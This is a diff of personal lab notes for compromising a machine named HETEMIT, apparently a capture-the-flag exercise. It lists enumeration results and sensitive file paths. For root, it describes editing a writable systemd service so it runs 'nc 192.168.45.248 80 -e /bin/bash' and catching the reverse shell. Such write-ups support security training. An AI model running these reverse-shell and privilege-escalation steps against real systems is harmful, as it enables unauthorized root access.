@@ -124,6 +124,9 @@ PORT      STATE SERVICE     VERSION
 
 User\cmeeks (Local User) 
 
+cmeeks:x:1000:1000::/home/cmeeks:/bin/bash
+postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
+
 Cmeeks          Disk      cmeeks Files
 
 HETEMIT        Wk Sv PrQ Unx NT SNT Samba 4.11.2
@@ -138,15 +141,33 @@ HETEMIT        Wk Sv PrQ Unx NT SNT Samba 4.11.2
 FTP anonymous login
 
 
+ruby 2.6.3
 
+/home/cmeeks/register_hetemit/config/master.key
+
+/etc/samba/smb.conf
+
+/var/lib/dnf/history.sqlite
+
+/etc/postgresql-setup/upgrade/postgresql.conf
+/usr/lib/tmpfiles.d/postgresql.conf
+
+Version: psql (PostgreSQL) 10.14
 
 ---
 ## Steps to User.txt
 
-
+Test port 50000 endpoints and get RCE [[Web Requests API]]
 
 ---
 ## Steps to root.txt
+
+Linpeas shows write access to nano /etc/systemd/system/pythonapp.service
+
+user : root
+execute nc 192.168.45.248 80 -e /bin/bash
+
+catch reverse shell with port 80 penelope
 
 
 ---
